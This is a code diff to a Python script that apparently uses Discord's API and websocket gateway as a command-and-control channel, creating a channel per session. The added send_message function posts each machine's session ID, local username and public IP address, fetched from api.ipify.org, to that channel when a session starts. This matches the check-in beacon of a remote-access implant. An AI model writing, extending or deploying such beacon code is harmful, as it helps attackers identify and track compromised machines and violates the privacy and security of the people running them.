@@ -20,6 +20,38 @@ async def send_heartbeat(ws, interval):
         }))
         await asyncio.sleep(interval)
 
+async def send_message(session, channel_id):
+    session.post(f"{API_URL}/channels/{channel_id}/messages", json={
+        "embeds": [{
+            "title": "New session created",
+            "description": "",
+            "color": 0xfafafa,
+            "fields": [
+                {
+                    "name": "Session ID",
+                    "value":  "```{}```".format(
+                        SESSION_ID
+                    ),
+                    "inline": True
+                },
+                {
+                    "name": "Username",
+                    "value": "```{}```".format(
+                        os.getenv("USERNAME")
+                    ),
+                    "inline": True
+                },
+                {
+                    "name": "IP Address",
+                    "value": "```{}```".format(
+                        requests.get("https://api.ipify.org").text
+                    ),
+                    "inline": False
+                }
+            ]
+        }]
+    })
+
 async def main():
     session = requests.Session()
     session.headers.update({
@@ -29,6 +61,7 @@ async def main():
         "name": SESSION_ID,
         "type": 0
     }).json()["id"]
+    await send_message(session, channel_id)
     ws = websocket.create_connection(f"{WS_URL}/?v=6&encoding=json")
     ws.send(json.dumps({
         "op": 2,
